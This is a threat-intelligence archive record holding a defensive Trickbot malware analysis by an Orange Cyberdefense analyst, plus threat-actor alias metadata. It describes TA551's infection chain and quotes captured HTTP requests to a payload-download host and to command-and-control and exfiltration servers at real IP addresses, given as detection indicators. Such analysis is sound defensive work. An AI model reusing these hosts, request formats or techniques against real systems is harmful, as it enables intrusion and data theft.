{
    "id": "3f3f3eac-0eb2-475a-a2ea-299a2cf1c208",
    "created_at": "2023-01-12T15:04:50.827895Z",
    "updated_at": "2025-03-27T02:13:58.368751Z",
    "deleted_at": null,
    "sha1_hash": "9b0c0855edd183aef4eb07d40bdc860692c625e2",
    "title": "2022-05-24 - Malware Analysis- Trickbot",
    "authors": "",
    "file_creation_date": "2022-06-01T12:23:22Z",
    "file_modification_date": "2022-06-01T12:23:22Z",
    "file_size": 194790,
    "plain_text": "# Malware Analysis: Trickbot\n\n**[thehackernews.com/2022/05/malware-analysis-trickbot.html](https://thehackernews.com/2022/05/malware-analysis-trickbot.html)**\n\nMay 24, 2022\n\nIn this day and age, we are not dealing with roughly pieced together, homebrew type of viruses\nanymore. Malware is an industry, and professional developers are found to exchange, be it by\nstealing one's code or deliberate collaboration. Attacks are multi-layer these days, with diverse\nsophisticated software apps taking over different jobs along the attack-chain from initial\ncompromise to ultimate data exfiltration or encryption. The specific tools for each stage are\nhighly specialized and can often be rented as a service, including customer support and\nsubscription models for professional (ab)use. Obviously, this has largely increased both the\navailability and the potential effectiveness and impact of malware. Sound scary?\n\nWell, it does, but the apparent professionalization actually does have some good sides too.\nOne factor is that certain reused modules commonly found in malware can be used to identify,\ntrack, and analyze professional attack software. Ultimately this means that, with enough\nexperience, skilled analysts can detect and stop malware in its tracks, often with minimal or no\ndamage (if the attackers make it through the first defense lines at all).\n\nLet's see this mechanic in action as we follow an actual CyberSOC analyst investigating the\ncase of the malware dubbed \"Trickbot.\"\n\n## Origins of Trickbot\n\n\n-----\n\nOrange Cyberdefense s CyberSOCs have been tracking the specific malware named Trickbot\nfor quite some time. It is commonly attributed to a specific Threat Actor generally known under\nthe name of Wizard Spider (Crowdstrike), UNC1778 (FireEye) or Gold Blackburn\n(Secureworks).\n\nTrickbot is a popular and modular Trojan initially used in targeting the banking industry, that has\nmeanwhile been used to compromise companies from other industries as well. It delivers\nseveral types of payloads. Trickbot evolved progressively to be used as Malware-as-a-Service\n(MaaS) by different attack groups.\n\nThe threat actor behind it is known to act quickly, using the well-known post-exploitation tool\nCobalt Strike to move laterally on the company network infrastructure and deploy ransomware\nlike Ryuk or Conti as a final stage. As it is used for initial access, being able to detect this threat\nas quickly as possible is a key element of success for preventing further attacks.\n\nThis threat analysis will be focused on the threat actor named TA551, and its use of Trickbot as\nan example. I will present how we are able to perform detection at the different steps of the kill\nchain, starting from the initial infection through malspam campaigns, moving on to the detection\nof tools used by the threat actor during compromise. We will also provide some additional\ninformation about how the threat actor is using this malware and the evolution it took.\n\n**1 — Initial access**\n\nSince June 2021, the group TA551 started delivering the Trickbot malware using an encrypted\nzip. The email pretext mimics an important information to reduce the vigilance of the user.\n\nThe attachment includes a .zip file which again includes a document. The zip file always uses\nthe same name as \"request.zip\" or \"info.zip\", and the same name for the document file.\n\n_NB: The Threat Actor used the same modus operandi before/in parallel to Trickbot to deliver_\n_other malware. We observed during the same period, from June 2021 to September 2021, the_\n_use of Bazarloader on the initial access payload._\n\n**2 — Execution**\n\nWhen the user opens the document with macros enabled, an HTA file will be dropped on the\nsystem and launched using cmd.exe. The HTA file is used to download the Trickbot DLL from a\nremote server.\n\nThis behavior is related to TA551, we can identify it with the pattern \"/bdfh/\" in the GET request.\n\n\n-----\n\n_GET /bdfh/M8v[..]VUb HTTP/1.1_\n\n_Accept: */*_\n\n_Host: wilkinstransportss.com_\n\n_Content-Type: application/octet-stream_\n\nNB: Patterns related to TA551 evolved with time, since mid-August 2021, the pattern changed\nto \"/bmdff/\". The DLL is registered as a jpg file to hide the real extension, and it tries to be run\nvia regsvr32.exe. Then, Trickbot will be injected into \"wermgr.exe\" using Process Hollowing\ntechniques.\n\nFigure 1 - Trickbot execution in the sandbox\n\n**3 — Collection**\n\nAfter the successful initial system compromise, Trickbot can collect a lot of information about its\ntarget using legitimate Windows executables and identify if the system is member of an Active\nDirectory domain.\n\nAdditionally, to this collection, Trickbot will scan more information like Windows build, the public\nIP address, the user that is running Trickbot, and also if the system is behind an NAT firewall.\n\nTrickbot is also able to collect sensitive information like banking data or credentials, and\nexfiltrate it to a dedicated command and control server (C2).\n\n**4 — Command & Control**\n\n\n-----\n\nWhen the system is infected, it can contact several kinds of Trickbot C2. The main C2 is the\none with which the victim system will communicate, mainly to get new instructions.\n\nAll requests to a Trickbot C2 use the following format:\n\n\"/<gtag>/<Client_ID>/<command>/<additionnal\n\ninformation about the command>/\"\n\n_GET_\n_/zev4/56dLzNyzsmBH06b_W10010240.42DF9F315753F31B13F17F5E731B7787/0/Windows_\n_10_\n_x64/1108/XX.XX.XX.XX/38245433F0E3D5689F6EE84483106F4382CC92EAFAD5120_\n\n_6571D97A519A2EF29/0bqjxzSOQUSLPRJMQSWKDHTHKEG/ HTTP/1.1_\n\n_Connection: Keep-Alive_\n\n_User-Agent: curl/7.74.0_\n\n_Host: 202.165.47.106_\n\nAll data collected is sent to a separate Exfiltration Trickbot C2 using HTTP POST request\nmethods. The request format keeps the same, but the command \"90\" is specific to data\nexfiltration, more precisely system data collected off the infected system.\n\n_POST_\n_/zev4/56dLzNyzsmBH06b_W10010240.42DF9F315753F31B13F17F5E731B7787/90/_\n_HTTP/1.1_\n\n_Connection: Keep-Alive_\n\n_Content-Type: multipart/form-data; boundary=------Bound_\n\n_ary0F79C562_\n\n_User-Agent: Ghost_\n\n_Host: 24.242.237.172:443_\n\n## Follow-up attacks: Cobalt Strike, Ryuk, Conti\n\nCobalt Strike[1] is a commercial, fully-featured, remote access tool that calls itself an\n\"adversary simulation software designed to execute targeted attacks and emulate the postexploitation actions of advanced threat actors\". Cobalt Strike's interactive post-exploit\ncapabilities cover the full range of ATT&CK tactics, all executed within a single, integrated\nsystem.\n\n\n-----\n\nIn our context, Trickbot uses the highjacked wermgr.exe process to load a Cobalt Strike beacon\ninto memory.\n\nSeveral ransomware operators are affiliated to the threat actors as well. The aim of Trickbot is\nto perform the initial access preceding the actual ransomware attack. Conti and Ryuk are the\nmain ransomwares observed on the final stage of Trickbot infections, though by far not the only\nones. Conti is a group that operates a Ransomware-as-a-Service model and is available to\nseveral affiliate threat actors. Ryuk on the other hand is a ransomware that is linked directly to\nthe threat actor behind Trickbot.\n\n## Key learnings\n\nThreat actors often still use basic techniques to get into the network like phishing emails.\nRaising awareness about phishing is definitely a great first step in building up cyber resilience.\nThe best attacks are, after all, the ones that never even get started.\n\nOf course, there is no such thing as bullet-proof preventive protection in cyber. It's all the more\nimportant to have the capability of detecting Trickbot at an early stage. Though the attack chain\ncan be broken at every stage along the way: the later it is, the higher the risk of full\ncompromise and the resulting damage. Trickbot is used by different threat actors, but the\ndetection approach stays the same on most of its specific stages. Some of the indicators of\ncompromise are explained here. But malware gets updates too.\n\nAnalysts have to stay vigilant. Tracking and watching a specific malware or a threat actor is a\nkey to follow its evolution, improvement, and keep up to date about an efficient detection of the\nthreat.\n\nThis is a story from the trenches found in the [Security Navigator. More malware analysis and](https://orangecyberdefense.com/global/security-navigator/)\nother interesting stuff including accounts of emergency response operations and a criminal\nscientist's view on cyber extortion, as well as tons of facts and figures on the security\nlandscape in general can be found there as well. The full report is available for download on\nthe Orange Cyberdefense website, so have a look. It's worth it!\n\n_[1] MITRE ATT&CK Cobaltstrike :_ _[https://attack.mitre.org/software/S0154/](https://attack.mitre.org/software/S0154/)_\n\n_This article was written by Florian Goutin, CyberSOC analyst at Orange Cyberdefense._\n\nSHARE _�_ _�_ _�_ _�_ __\nSHARE _�_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-24 - Malware Analysis- Trickbot.pdf"
    ],
    "report_names": [
        "2022-05-24 - Malware Analysis- Trickbot.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535890,
    "ts_updated_at": 1743041638,
    "ts_creation_date": 1654086202,
    "ts_modification_date": 1654086202,
    "files": {
        "pdf": "https://archive.orkl.eu/9b0c0855edd183aef4eb07d40bdc860692c625e2.pdf",
        "text": "https://archive.orkl.eu/9b0c0855edd183aef4eb07d40bdc860692c625e2.txt",
        "img": "https://archive.orkl.eu/9b0c0855edd183aef4eb07d40bdc860692c625e2.jpg"
    }
}